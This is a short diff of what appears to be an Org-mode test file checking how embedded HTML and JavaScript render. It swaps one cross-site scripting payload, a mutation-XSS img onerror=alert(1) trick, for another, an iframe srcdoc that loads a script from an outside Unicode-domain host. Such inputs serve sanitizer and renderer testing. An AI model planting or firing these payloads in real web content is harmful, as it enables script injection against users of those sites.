@@ -13,8 +13,8 @@ And this will render some Javascript:
 They behave as follows:
 
 #+begin_html
-<p> Hi </p><<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
-
+<p> Hi </p>
+<iframe/srcdoc="<script/src=//Ǌ.₨></script>">
 <h2> This is h2 <h2>
 
 <pre>
